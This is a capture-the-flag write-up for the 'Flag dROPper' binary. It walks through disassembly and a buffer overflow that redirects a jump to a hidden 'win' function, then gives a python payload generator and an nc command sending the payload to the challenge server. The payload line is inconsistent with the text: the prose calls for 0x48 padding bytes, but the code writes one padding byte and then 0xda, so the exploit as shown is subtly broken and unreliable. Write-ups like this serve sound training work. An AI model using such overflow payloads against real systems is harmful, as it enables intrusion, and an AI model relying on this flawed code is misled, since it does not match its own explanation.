# Flag dROPper

The challenge provided an ELF executable that prints some text and waits for user input.

```
$ ./flagDropper
Welcome to the Flag Dropper!
Make sure to catch the flag when its dropped!
1,
2,
3,
CATCH
f
```

The ```checksec``` command in ```gef``` yelds a simple binary without relevant security measures
```
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

Disassembling the binary yelds a function with several syscalls and a ```JMP```.
```
0000000000400540 <main>:
  400540:       55                      push   rbp
  400541:       48 89 e5                mov    rbp,rsp
  400544:       b8 01 00 00 00          mov    eax,0x1
  400549:       bf 01 00 00 00          mov    edi,0x1
  40054e:       48 be 38 10 60 00 00    movabs rsi,0x601038
  400555:       00 00 00
  400558:       ba 4b 00 00 00          mov    edx,0x4b
  40055d:       0f 05                   syscall
  40055f:       b8 01 00 00 00          mov    eax,0x1
  400564:       bf 01 00 00 00          mov    edi,0x1
  400569:       48 be 84 10 60 00 00    movabs rsi,0x601084
  400570:       00 00 00
  400573:       ba 11 00 00 00          mov    edx,0x11
  400578:       0f 05                   syscall
  40057a:       48 8d 04 25 a4 10 60    lea    rax,ds:0x6010a4
  400581:       00
  400582:       48 83 c0 48             add    rax,0x48
  400586:       c7 00 d0 05 40 00       mov    DWORD PTR [rax],0x4005d0
  40058c:       b8 00 00 00 00          mov    eax,0x0
  400591:       bf 00 00 00 00          mov    edi,0x0
  400596:       48 be a4 10 60 00 00    movabs rsi,0x6010a4
  40059d:       00 00 00
  4005a0:       ba c8 00 00 00          mov    edx,0xc8
  4005a5:       0f 05                   syscall
  4005a7:       b8 01 00 00 00          mov    eax,0x1
  4005ac:       bf 01 00 00 00          mov    edi,0x1
  4005b1:       48 be a4 10 60 00 00    movabs rsi,0x6010a4
  4005b8:       00 00 00
  4005bb:       ba 40 00 00 00          mov    edx,0x40
  4005c0:       0f 05                   syscall
  4005c2:       48 8d 04 25 a4 10 60    lea    rax,ds:0x6010a4
  4005c9:       00
  4005ca:       48 83 c0 48             add    rax,0x48
  4005ce:       ff 20                   jmp    QWORD PTR [rax]

00000000004005d0 <_exit>:
  4005d0:       b8 3c 00 00 00          mov    eax,0x3c
  4005d5:       48 31 ff                xor    rdi,rdi
  4005d8:       0f 05                   syscall

00000000004005da <win>:
  4005da:       b8 00 00 00 00          mov    eax,0x0
  4005df:       48 8d 34 25 9d 10 60    lea    rsi,ds:0x60109d
  4005e6:       00
  4005e7:       48 8d 3c 25 94 10 60    lea    rdi,ds:0x601094
  4005ee:       00
  4005ef:       e8 4c fe ff ff          call   400440 <fopen@plt>
  4005f4:       48 89 c2                mov    rdx,rax
  4005f7:       b8 00 00 00 00          mov    eax,0x0
  4005fc:       48 bf 24 11 60 00 00    movabs rdi,0x601124
  400603:       00 00 00
  400606:       be 16 00 00 00          mov    esi,0x16
  40060b:       e8 20 fe ff ff          call   400430 <fgets@plt>
  400610:       bf 01 00 00 00          mov    edi,0x1
  400615:       b8 01 00 00 00          mov    eax,0x1
  40061a:       ba 16 00 00 00          mov    edx,0x16
  40061f:       0f 05                   syscall
  400621:       eb ad                   jmp    4005d0 <_exit>
  400623:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  40062a:       00 00 00
  40062d:       0f 1f 00                nop    DWORD PTR [rax]
```

The ```JMP``` at address ```0x4005ce``` uses the data at the end of the buffer, after byte ```0x48```.
This buffer seems to hold the result of the text provided by the user.
After the ```JMP``` the program exits. Interestingly, there is a label ```win``` after the exit, whichs opens
a file, gets the result, prints the result using a ```syscall``` and then exits. Seems like we have a winner!

Further inspection with ```gdb``` shows that the memory used for the buffer is full of ```0x00``` and ends with ``` 0x4005d0```.
Therefore, without an overflow, the code will jump to the exist section and will terminate the program.

A valid attack would be to provide a payload with ```0x48``` bytes of padding and then ```0x4005da```. 
This would make the code jump to the ```win``` method.

To generate the payload:
```
python3 -c "with open('payload', 'wb') as f: f.write(b'\xaa'+b'\xda')"
```
We only need to write ```0xda``` as the result of the address has the same prefix (```0x4005```)


Then send the payload to the server:
```
nc dropper.sdc.tf 1337 < payload
```

which would provide the flag.

